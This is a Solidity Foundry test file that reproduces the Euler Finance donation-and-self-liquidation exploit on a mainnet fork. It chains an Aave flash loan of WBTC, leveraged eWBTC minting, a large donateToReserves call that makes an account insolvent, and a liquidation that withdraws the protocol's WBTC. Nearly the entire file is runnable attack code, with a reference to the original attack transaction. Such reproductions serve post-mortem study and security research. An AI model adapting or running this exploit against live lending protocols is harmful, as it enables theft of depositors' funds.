// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

// @Tx(One of the attack transactions)
// https://etherscan.io/tx/0x71a908be0bef6174bccc3d493becdfd28395d78898e355d451cb52f7bac38617

/* ========== Basic Information ========== */
abstract contract Base {
    IERC20 internal constant  WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    EToken internal constant  eWBTC = EToken(0x0275b156cD77c5ed82D44bCc5f9E93eECff20138);
    DToken internal constant  dWBTC = DToken(0x36c4A49F624342225bA45fcfc2e1A4BcBCDcE557);
    IEuler internal constant   Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    AAVE internal constant  AaveV2 = AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address internal constant  Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
}

/* ========== Attack Test ========== */
contract ContractTest is Test, Base {
    IViolator violator;
    ILiquidator liquidator;
    
    function setUp() public {
        vm.createSelectFork("mainnet", 16_818_056);
        vm.label(address(WBTC), "WBTC");
        vm.label(address(eWBTC), "eWBTC");
        vm.label(address(dWBTC), "dWBTC");
        vm.label(address(Euler), "Euler");
        vm.label(address(Euler), "Euler");
        vm.label(address(AaveV2), "AaveV2");
    }

    function testStart() public {
        uint256 aaveFlashLoanAmount = 300_000_000_000;
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint[](1);
        assets[0] = address(WBTC);
        amounts[0] = aaveFlashLoanAmount;
        bytes memory params = "0x0000000000000000000000000000000000000000000000000000000000000bb80000000000000000000000000000000000000000000000000000000000004e20000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000000011300000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000275b156cd77c5ed82d44bcc5f9e93eecff2013800000000000000000000000036c4a49f624342225ba45fcfc2e1a4bcbcdce557";
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
        console2.log(WBTC.balanceOf(address(this)));
    }

    function executeOperation(
        address[] memory assets, 
        uint256[] memory amounts, 
        uint256[] memory premiums, 
        address initiator, 
        bytes memory params
        )external returns (bool) {
            WBTC.approve(address(AaveV2), type(uint256).max);
            violator = new IViolator();
            liquidator = new ILiquidator();
            WBTC.transfer(address(violator), WBTC.balanceOf(address(this)));
            violator.violator();
            liquidator.liquidate(address(violator), address(liquidator));
            return true;
        } 
}



contract IViolator is Base {
    function violator() external {
        WBTC.approve(Euler_Protocol, type(uint256).max);
        eWBTC.deposit(0, 200_000_000_000);
        eWBTC.mint(0, 2_000_000_000_000);
        dWBTC.repay(0, 100_000_000_000);
        eWBTC.mint(0, 2_000_000_000_000);
        eWBTC.donateToReserves(0, 10_000_000_000_000_000_000_000);       
    }
}

contract ILiquidator is Base {
    function liquidate(address violator, address liquidator) external {
            IEuler.LiquidationItems memory returnData = Euler.checkLiquidation(liquidator, violator, address(WBTC), address(WBTC));
            Euler.liquidate(violator, address(WBTC), address(WBTC), returnData.repay, returnData.yield);
            eWBTC.withdraw(0, WBTC.balanceOf(Euler_Protocol));
            WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
    }
}


/* ========== Interface ========== */
interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEuler {
    struct LiquidationItems{
        uint256 repay;
        uint256 yield; 
        uint256 healthScore; 
        uint256 baseDiscount; 
        uint256 discount;
        uint256 conversionRate;
    }

    function checkLiquidation(address liquidator, address violator, address underlying, address collateral) external returns (LiquidationItems memory liqOpp);
    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield) external; 
}

interface AAVE{
    function flashLoan(
        address receiverAddress,
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory modes,
        address onBehalfOf,
        bytes memory params,
        uint16 referralCode
    ) external;
}
